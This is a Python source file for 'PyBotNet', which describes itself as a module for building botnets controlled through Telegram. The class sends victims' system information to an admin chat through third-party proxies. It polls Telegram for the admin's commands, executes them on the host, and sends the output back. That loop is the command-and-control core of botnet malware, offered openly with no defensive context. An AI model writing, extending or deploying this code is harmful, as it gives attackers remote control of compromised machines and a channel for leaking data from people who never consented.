# import built-in & third-party modules
import logging

# import pybotnet modules
import util
import scripts
import settings


class PyBotNet:
    '''
    A module for building botnets with Python and Telegram control panel\n
    '''

    def __init__(
        self,
        TELEGRAM_TOKEN,
        ADMIN_CHAT_ID,
        show_log=False,
        send_system_data=True
    ):

        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
        self.show_log = show_log  # show logs
        self.send_system_data = send_system_data  # send system info in message

        self.start_time = util.get_current_epoc_time()
        # logging:
        if self.show_log:
            # show all log's
            self.log_level = logging.INFO
        else:
            # off all log's
            self.log_level = 100
        self.my_logger = logging
        self.my_logger.basicConfig(level=self.log_level)
        self.logger = self.my_logger.getLogger('PyBotNet')

    def __str__(self) -> str:
        return settings.pybotnet_info

    def pybotnet_up_time(self) -> int:
        return util.get_current_epoc_time() - self.start_time

    def send_message_by_third_party_proxy(self, message):
        '''Send messages by api url and third party proxy to adimn'''

        if self.send_system_data:
            message = f'{message} \n\n {util.get_short_system_info()}'

        self.api_url = util.make_send_message_api_url(
            self.TELEGRAM_TOKEN, self.ADMIN_CHAT_ID, message)

        return util.post_data_by_third_party_proxy(self.api_url, self.logger)

    def send_message(self, message):
        '''Send messages by api url to adimn'''

        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)

        return util.post_data(self.api_url, self.logger)

    def get_last_command_by_third_party_proxy(self):
        '''return last message from admin or False'''

        messages_list = (util.get_update_by_third_party_proxy(
            self.TELEGRAM_TOKEN, self.logger))

        # if message list not False > extract last message from admin > if last admin message not False return
        if messages_list:
            last_message = util.extract_last_admin_command(
                messages_list, self.ADMIN_CHAT_ID, self.TELEGRAM_TOKEN, self.logger)

            if last_message:
                return last_message

        return False

    def get_and_execute_scripts_by_third_party_proxy(self):

        self.command = self.get_last_command_by_third_party_proxy()
        if self.command:

            if scripts.is_command(self.command):

                self.send_message_by_third_party_proxy(
                    f'command received: \n{self.command}')

                self.output = scripts.execute_scripts(
                    self.command, self.pybotnet_up_time(), self.logger)

                if self.output:
                    self.send_message_by_third_party_proxy(
                        f'output: \n{self.output}')
